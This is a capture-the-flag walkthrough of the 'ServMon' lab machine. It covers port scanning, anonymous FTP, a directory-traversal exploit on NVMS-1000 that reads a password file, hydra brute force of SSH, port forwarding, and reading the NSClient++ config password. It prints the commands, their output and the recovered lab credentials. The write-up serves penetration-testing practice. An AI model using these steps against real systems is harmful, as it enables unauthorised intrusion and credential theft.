# ServMon

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled.jpeg)

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.184
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 15:49 IST
Warning: 10.10.10.184 giving up on port because retransmission cap hit (6).
Stats: 0:25:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.79% done; ETC: 16:15 (0:00:00 remaining)
Nmap scan report for 10.10.10.184
Host is up (0.17s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open     ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open     http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
5666/tcp  open     tcpwrapped
6063/tcp  open     tcpwrapped
6699/tcp  open     napster?
8443/tcp  open     ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
45604/tcp filtered unknown
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     msrpc         Microsoft Windows RPC
```
{: .nolineno}

## FTP Enumeration ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ ftp 10.10.10.184 21
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49677|)
125 Data connection already open; Transfer starting.
02-28-22  06:35PM       <DIR>          Users
226 Transfer complete.
ftp>
ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49679|)
150 Opening ASCII mode data connection.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49680|)
150 Opening ASCII mode data connection.
02-28-22  06:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get confidential.txt
local: confidential.txt remote: confidential.txt
229 Entering Extended Passive Mode (|||49681|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************|   168        0.81 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 6 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
168 bytes received in 00:00 (0.57 KiB/s)
ftp> cd ..
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49682|)
c125 Data connection already open; Transfer starting.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nathan
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49683|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> get Notes\ to\ do.txt
local: Notes to do.txt remote: Notes to do.txt
229 Entering Extended Passive Mode (|||49685|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************|   182        0.70 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 4 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
182 bytes received in 00:00 (0.70 KiB/s)
ftp>
```
{: .nolineno}

These were the content of these files :

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ cat confidential.txt           
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
{: .nolineno}

## Web Enumeration ⤵️

I checked port 80 and got this `NVMS-1000` CMS site :

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled.png)

I checked online about its vulnerability and I got one exploit related to directory or files bruteforcing so lets use this exploit →

[TVT NVMS 1000 - directory or files bruteforcing](https://www.exploit-db.com/exploits/48311)

I used this exploit but it throws some error so I used another same exploit from this github →

[](https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py)

I got this site vulnerable and some content out →

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled%201.png)

I got the hint from `confidentials.txt` file as Passwords.txt file save in Desktop directory of Nathan user so lets check that directory.

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ python3 exploit3.py 10.10.10.184 Users/Nathan/Desktop/Passwords.txt win.txt
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
++++++++++  END  ++++++++++
```
{: .nolineno}

  

I got a list of passwords so lets save them in a file called password.txt and take usernames in another file as user.txt and then run bruteforce on ssh login service.

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ hydra -L user.txt -P passwords.txt ssh://10.10.10.184 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 20:31:03
[DATA] max 4 tasks per 1 server, overall 4 tasks, 28 login tries (l:4/p:7), ~7 tries per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 20:31:15
                                                                        
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ cat user.txt 
nathan
nadine
Nathan
Nadine
```
{: .nolineno}

## SSH Login ⤵️

I got the `nadine` user shell →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ ssh nadine@10.10.10.184                                                         
The authenticity of host '10.10.10.184 (10.10.10.184)' cant be established.
ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.184' (ED25519) to the list of known hosts.
nadine@10.10.10.184's password: 

Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
 
nadine@SERVMON C:\Users\Nadine>hostname
ServMon

nadine@SERVMON C:\Users\Nadine>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

nadine@SERVMON C:\Users\Nadine>
nadine@SERVMON C:\Users\Nadine>tree /f /a
Folder PATH listing
Volume serial number is 20C1-47A1
C:.
+---3D Objects
+---Contacts
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos

nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
3b0ecf36b44ad9131a1e3f0ff40dd3c2

nadine@SERVMON C:\Users\Nadine>
```
{: .nolineno}

I don’t have very good privileges so I enumerated few other services like port 8443 which is running `NSClinet++` site.

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled%202.png)

This site is not properly opening or operating. I also looked into `NSClient++` site vulnerability and I got this exploit :

[NSClient++ 0.5.2.35 - Privilege Escalation](https://www.exploit-db.com/exploits/46802)

But I can’t use it on this broken site, so lets do `port forwarding` on port 8443 through SSH service →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/ServMon]
└─$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
nadine@10.10.10.184's password: 

Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine> 
```
{: .nolineno}

I got this port 8443 on 127.0.0.1 (localhost) site so lets access the `NSClient++` site , and lets use that exploit to move further and find the password →

I opened this file `c:\program files\nsclient++\nsclient.ini` and got the password →

```bash
PS C:\Program Files\NSClient++> cat nsclient.ini
# If you want to fill this file with all available options run the following command: 
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help

; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key 
allowed hosts = 127.0.0.1

; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3
```
{: .nolineno}

I also noticed host 127.0.0.1 is allowed so lets use the password for login and After login I got this dashboard →

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled%203.png)

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled%204.png)

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled%205.png)

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled%206.png)

![Untitled](ServMon%207fb0dcf05f0a4e52a7c27a9aac6d2228/Untitled%207.png)